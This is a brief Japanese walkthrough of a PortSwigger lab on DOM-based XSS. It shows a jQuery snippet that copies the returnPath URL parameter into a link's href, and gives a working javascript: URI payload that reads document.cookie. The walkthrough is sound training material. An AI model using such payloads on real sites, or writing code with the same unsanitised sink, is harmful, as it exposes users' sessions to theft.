# location.search を利用して、href 属性に DOM XSS を埋め込む

以下のハッキングラボを実施します
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

このラボには、フィードバック送信ページに DOM ベースのクロスサイト スクリプティングの脆弱性が含まれています。

- 1. ハッキングラボにアクセスします
- 2. フィードバックページのソースを確認します

```html
<script>
  $(function () {
    $("#backLink").attr("href", new URLSearchParams(window.location.search).get("returnPath"));
  });
</script>
```

- 3. URL は次のようになっており、returnPath パラメータが動的に設定されています

https://0a4e00df03dc5380830c9265006f0018.web-security-academy.net/feedback?returnPath=/

- 4. returnPath パラメータを JavaSctipt URI を指定するとスクリプトが実行できます
     https://0a4e00df03dc5380830c9265006f0018.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
